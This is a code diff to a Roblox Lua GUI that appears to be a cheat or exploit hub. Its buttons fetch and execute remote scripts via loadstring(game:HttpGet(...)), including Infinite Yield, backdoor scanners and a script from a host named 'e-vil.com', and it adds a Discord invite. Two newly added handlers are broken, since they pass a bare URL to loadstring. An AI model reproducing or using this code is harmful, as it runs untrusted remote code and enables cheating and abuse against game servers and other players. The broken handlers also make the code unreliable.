@@ -10,7 +10,9 @@ local UICorner_2 = Instance.new("UICorner")
 local InfiniteYeild = Instance.new("TextButton")
 local StrawberryAdmin = Instance.new("TextButton")
 local REM = Instance.new("TextButton")
-local soon = Instance.new("TextButton")
+local USMMenyoo = Instance.new("TextButton")
+local LalolHub = Instance.new("TextButton")
+local CORD = Instance.new("TextLabel")
 local USM = Instance.new("ImageLabel")
 local USM_2 = Instance.new("ImageLabel")
 local USM_3 = Instance.new("ImageLabel")
@@ -88,20 +90,50 @@ REM.TextScaled = true
 REM.TextSize = 14.000
 REM.TextWrapped = true
 
-soon.Name = "soon"
-soon.Parent = mainframe
-soon.BackgroundColor3 = Color3.fromRGB(74, 74, 74)
-soon.BorderColor3 = Color3.fromRGB(0, 0, 0)
-soon.BorderSizePixel = 0
-soon.Position = UDim2.new(0.117309429, 0, 0.481205612, 0)
-soon.Size = UDim2.new(0, 332, 0, 109)
-soon.Font = Enum.Font.Unknown
-soon.LineHeight = 3.000
-soon.Text = "COMING SOON"
-soon.TextColor3 = Color3.fromRGB(189, 127, 13)
-soon.TextScaled = true
-soon.TextSize = 14.000
-soon.TextWrapped = true
+USMMenyoo.Name = "USM Menyoo"
+USMMenyoo.Parent = mainframe
+USMMenyoo.BackgroundColor3 = Color3.fromRGB(74, 74, 74)
+USMMenyoo.BorderColor3 = Color3.fromRGB(0, 0, 0)
+USMMenyoo.BorderSizePixel = 0
+USMMenyoo.Position = UDim2.new(0.115000002, 0, 0.5, 0)
+USMMenyoo.Size = UDim2.new(0, 332, 0, 25)
+USMMenyoo.Font = Enum.Font.Unknown
+USMMenyoo.LineHeight = 3.000
+USMMenyoo.Text = "USM Menyoo"
+USMMenyoo.TextColor3 = Color3.fromRGB(189, 127, 13)
+USMMenyoo.TextScaled = true
+USMMenyoo.TextSize = 14.000
+USMMenyoo.TextWrapped = true
+
+LalolHub.Name = "Lalol Hub"
+LalolHub.Parent = mainframe
+LalolHub.BackgroundColor3 = Color3.fromRGB(74, 74, 74)
+LalolHub.BorderColor3 = Color3.fromRGB(0, 0, 0)
+LalolHub.BorderSizePixel = 0
+LalolHub.Position = UDim2.new(0.115000002, 0, 0.649999976, 0)
+LalolHub.Size = UDim2.new(0, 332, 0, 25)
+LalolHub.Font = Enum.Font.Unknown
+LalolHub.LineHeight = 3.000
+LalolHub.Text = "Lalol Hub"
+LalolHub.TextColor3 = Color3.fromRGB(189, 127, 13)
+LalolHub.TextScaled = true
+LalolHub.TextSize = 14.000
+LalolHub.TextWrapped = true
+
+CORD.Name = "CORD"
+CORD.Parent = mainframe
+CORD.BackgroundColor3 = Color3.fromRGB(74, 74, 74)
+CORD.BorderColor3 = Color3.fromRGB(0, 0, 0)
+CORD.BorderSizePixel = 0
+CORD.Position = UDim2.new(0.115000002, 0, 0.800000012, 0)
+CORD.Size = UDim2.new(0, 332, 0, 25)
+CORD.Font = Enum.Font.Unknown
+CORD.LineHeight = 3.000
+CORD.Text = "discord.gg/cd6D5NUm3A"
+CORD.TextColor3 = Color3.fromRGB(189, 127, 13)
+CORD.TextScaled = true
+CORD.TextSize = 14.000
+CORD.TextWrapped = true
 
 USM.Name = "USM"
 USM.Parent = RedBacground
@@ -149,37 +181,7 @@ USM_4.ImageTransparency = 0.200
 
 -- Scripts:
 
-local function YTPXC_fake_script() -- InfiniteYeild.Script 
-	local script = Instance.new('Script', InfiniteYeild)
-
-	local button = script.Parent
-	
-	button.MouseButton1Click:Connect(function()
-		loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
-	end)
-end
-coroutine.wrap(YTPXC_fake_script)()
-local function FZLQ_fake_script() -- StrawberryAdmin.Script 
-	local script = Instance.new('Script', StrawberryAdmin)
-
-	local button = script.Parent
-	
-	button.MouseButton1Click:Connect(function()
-		loadstring(game:HttpGet("https://raw.githubusercontent.com/StrawberryRBLX/Strawberry-Scanner/refs/heads/main/nightly/scanner.lua"))()
-	end)
-end
-coroutine.wrap(FZLQ_fake_script)()
-local function ECTO_fake_script() -- REM.Script 
-	local script = Instance.new('Script', REM)
-
-	local button = script.Parent
-	
-	button.MouseButton1Click:Connect(function()
-		loadstring(game:HttpGet("https://e-vil.com/anbu/rem.lua"))()
-	end)
-end
-coroutine.wrap(ECTO_fake_script)()
-local function TZIMX_fake_script() -- RedBacground.LocalScript 
+local function UKEB_fake_script() -- RedBacground.LocalScript 
 	local script = Instance.new('LocalScript', RedBacground)
 
 	-- LocalScript inside the Frame
@@ -224,4 +226,55 @@ local function TZIMX_fake_script() -- RedBacground.LocalScript
 	end)
 	
 end
-coroutine.wrap(TZIMX_fake_script)()
+coroutine.wrap(UKEB_fake_script)()
+local function NXGIYOK_fake_script() -- InfiniteYeild.Script 
+	local script = Instance.new('Script', InfiniteYeild)
+
+	local button = script.Parent
+	
+	button.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
+	end)
+end
+coroutine.wrap(NXGIYOK_fake_script)()
+local function ZVACIVQ_fake_script() -- StrawberryAdmin.Script 
+	local script = Instance.new('Script', StrawberryAdmin)
+
+	local button = script.Parent
+	
+	button.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/StrawberryRBLX/Strawberry-Scanner/refs/heads/main/nightly/scanner.lua"))()
+	end)
+end
+coroutine.wrap(ZVACIVQ_fake_script)()
+local function JFAJ_fake_script() -- REM.Script 
+	local script = Instance.new('Script', REM)
+
+	local button = script.Parent
+	
+	button.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet("https://e-vil.com/anbu/rem.lua"))()
+	end)
+end
+coroutine.wrap(JFAJ_fake_script)()
+local function JWHR_fake_script() -- USMMenyoo.Script 
+	local script = Instance.new('Script', USMMenyoo)
+
+	local button = script.Parent
+	
+	button.MouseButton1Click:Connect(function()
+		loadstring("https://raw.githubusercontent.com/STEVEO-5TVO-01/USM/refs/heads/main/USMMenyoo.lua")
+	end)
+end
+coroutine.wrap(JWHR_fake_script)()
+local function BZCZNTO_fake_script() -- LalolHub.Script 
+	local script = Instance.new('Script', LalolHub)
+
+	local button = script.Parent
+	
+	button.MouseButton1Click:Connect(function()
+		loadstring("https://raw.githubusercontent.com/Its-LALOL/LALOL-Hub/refs/heads/main/Backdoor-Scanner/script")
+	end)
+end
+coroutine.wrap(BZCZNTO_fake_script)()
+
